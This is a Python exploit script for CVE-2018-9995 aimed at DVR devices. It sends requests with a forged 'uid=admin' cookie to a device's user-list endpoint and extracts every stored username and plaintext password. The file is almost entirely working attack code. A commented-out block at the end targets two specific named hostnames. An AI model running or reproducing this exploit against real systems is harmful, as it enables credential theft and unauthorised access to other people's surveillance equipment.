# -*- coding: utf-8 -*-
from __future__ import print_function
import json
import requests

details = ''' 
 # Exploit Title:   DVRs; Credentials Exposed
 # Date:            09/04/2018
 # Exploit Author:  Fernandez Ezequiel ( @capitan_alfa )
 # version: 1.2
'''

class Colors:
    BLUE        = '\033[94m'
    GREEN       = '\033[32m'
    RED         = '\033[0;31m'
    DEFAULT     = '\033[0m'
    ORANGE      = '\033[33m'
    WHITE       = '\033[97m'
    BOLD        = '\033[1m'
    BR_COLOUR   = '\033[1;37;40m'

class CVE_2018_9995:
    def MakeReqHeaders(self, cookie):
        headers = {}
        headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
        headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
        headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
        headers["Connection"]       = "close"
        headers["Content-Type"]     = "text/html"
        headers["Cookie"]           = "uid="+cookie
        return headers
    def run(self, host, port='80', cookie = "admin"):
        _url = "http://"+host+":"+str(port)+"/device.rsp?opt=user&cmd=list"
        _headers = self.MakeReqHeaders(cookie)
        _res = self.LoadRes(_url, _headers)
        _json = None if _res == None else self.ParseRes(_res)
        _dicts = None if _json == None else self.JsonToDicts(_json[0], _json[1])
        if _dicts:
            return (host, port, _dicts)
    def LoadRes(self, url, headers):
        res = None
        try:
            res = requests.get(url, headers=headers, timeout=10.000)
        except Exception as e:
            res = None
        return res
    def ParseRes(self, res):
        jsondata = res.text
        ans = None
        try:
            datajson = json.loads(jsondata)
            totUsr = len(datajson['list'])
            ans = (totUsr, datajson['list'])
        except Exception as e:
            ans = None
        return ans
    def JsonToDicts(self, totals, jsons):
        users = {}
        try:
            for index in range(0, totals):
                temp = []
                users[jsons[index]["uid"]]=jsons[index]["pwd"]
        except Exception as e:
            users = None
        return users
'''
cve = CVE_2018_9995()
cve.run(host = "skeletonjewelry.com")
cve.run(host = "mail.binns.net")
'''
